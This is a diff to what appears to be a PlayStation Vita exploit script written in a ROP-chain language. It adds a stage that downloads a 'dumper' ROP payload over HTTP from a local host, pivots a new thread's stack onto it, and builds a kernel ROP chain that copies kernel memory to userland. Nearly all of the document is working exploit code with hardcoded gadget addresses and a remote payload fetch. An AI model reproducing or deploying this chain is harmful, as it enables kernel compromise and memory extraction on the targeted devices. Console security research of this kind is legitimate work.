@@ -13,6 +13,9 @@ data
     func sceKernelAllocMemBlock = 0xE000B0BC;
     func sceKernelGetMemBlockBase = 0xE000B0AC;
 
+    func sceKernelCreateThread = 0xE000B03D;
+    func sceKernelStartThread = 0xE000AAD9;
+
     func memset = 0x810E20E1;
     func memcpy = 0x810E1EA9;
 
@@ -21,25 +24,74 @@ data
     symbol LDM_ADDR_PC = 0x81204010;
     symbol STAGE2_URL = %(writes("http://192.168.2.1:8080/"))s;
     symbol HTTP_HANDLE = %(writes("AAAAAAAA"))s;
-    symbol POP_GADGET = 0x89C004A7;
+    symbol POP_GADGET = 0x89C004A7; // pop {pc}
 
-    symbol HTTPBUF_ADDR = 0x8120C000;
     symbol MEMBLOCK_BASE = 0x8120D000;
     symbol ENCDEC_SCRATCH = 0x81210000;
 
     symbol KROP = 0x81220000;
+
+    symbol DUMPER_URL = %(writes("http://192.168.2.1:8000/dumper.bin"))s;
+    symbol DUMPER_ADDR = 0x812D0000;
+
+    symbol PIVOT_SETUP = 0x8120C000;
+    symbol PIVOT = 0x89E035B0; // 2035b0: e891b081 ldm r1, {r0, r7, ip, sp, pc}
+    symbol THREAD = %(writes("AAAA"))s;
+
+    symbol k_pop_r0_r4_pc = 0x4ad471;
+    symbol k_blx_r4_pop_r4_pc = 0x49aed3;
+    symbol k_infloop = 0x4b2063;
+    symbol k_sceKernelMemcpyKernelToUser = 0x48A1D9;
 }
 
 code : entry
 {
     $writedata$
 
-    sceKernelAllocMemBlock(%(writes(""))s, 0x0c20d060, 0x10000, 0);
+    // we create a new thread to dump data
+    // first, download dumper rop chain
+    sceHttpCreateTemplate(
+        %(writes(""))s /*useragent*/,
+        2 /*http_ver*/,
+        1 /*auto_proxy*/);
+    sceHttpCreateConnectionWithURL(RET, DUMPER_URL, 0);
+    sceHttpCreateRequestWithURL(RET, 0, DUMPER_URL, 0, 0, 0);
+    storeret(HTTP_HANDLE);
+    loadret(HTTP_HANDLE);
+    sceHttpSendRequest(RET, 0, 0);
+    loadret(HTTP_HANDLE);
+    sceHttpReadData(RET, DUMPER_ADDR, 0x10000);
+    // now create a thread for it
+    sceKernelCreateThread(%(writes(""))s, PIVOT, 0x10000100, 0x1000, 0, 0, 0);
+    storeret(THREAD);
+    store(DUMPER_ADDR, PIVOT_SETUP + 3*4); // sp=DUMPER_ADDR
+    store(POP_GADGET, PIVOT_SETUP + 4*4); // pc=pop {pc}
+    loadret(THREAD);
+    sceKernelStartThread(RET, 5*4, PIVOT_SETUP); // r1 will contain ptr to a copy of PIVOT_SETUP
+
+    // ok, back to the kx
+
+    sceKernelAllocMemBlock(%(writes(""))s, 0x0c20d060, 0x20000, 0);
     sceKernelGetMemBlockBase(RET, MEMBLOCK_BASE);
     loadret(MEMBLOCK_BASE);
-    storeret(HTTPBUF_ADDR);
 
-    store(0x4b2063, KROP);
+    // 0x000000000001aed3 : blx r4 ; pop {r4, pc}
+    // 0x000000000002d471 : pop {r0, r1, r2, r3, r4, pc}
+
+    // start krop
+    store(k_pop_r0_r4_pc, KROP + 4 * 0);
+    store(0x812B0000, KROP + 4 * 1); // r0 = dst
+    store(0x480000, KROP + 4 * 2); // r1 = src
+    store(0x1000, KROP + 4 * 3); // r2 = sz
+    store(0, KROP + 4 * 4); // r3
+    store(k_sceKernelMemcpyKernelToUser, KROP + 4 * 5); // r4 = fptr
+    store(k_blx_r4_pop_r4_pc, KROP + 4 * 6);
+    store(0, KROP + 4 * 7); // r4
+    store(k_infloop, KROP + 4 * 8); // infloop
+    // end krop
+
+    store(k_infloop, KROP); // infloop
+
     loadret(MEMBLOCK_BASE);
     addret(0x1FF68 + 0x6C);
     memcpy(RET, KROP, 0x100);
@@ -49,18 +101,6 @@ code : entry
     // svc(0x2c0);
     // storeret(HTTPBUF_ADDR);
     // store(0x41414141, HTTPBUF_ADDR+4);
-
-    sceHttpCreateTemplate(
-        %(writes("aaa"))s /*useragent*/,
-        2 /*http_ver*/,
-        1 /*auto_proxy*/);
-
-    sceHttpCreateConnectionWithURL(RET, STAGE2_URL, 0);
-    sceHttpCreateRequestWithURL(RET, 1, STAGE2_URL, 0, 0, 0x10000);
-    storeret(HTTP_HANDLE);
-
-    loadret(HTTP_HANDLE);
-    sceHttpSendRequest(RET, HTTPBUF_ADDR, 0x100);
 
     infloop(0);
 }
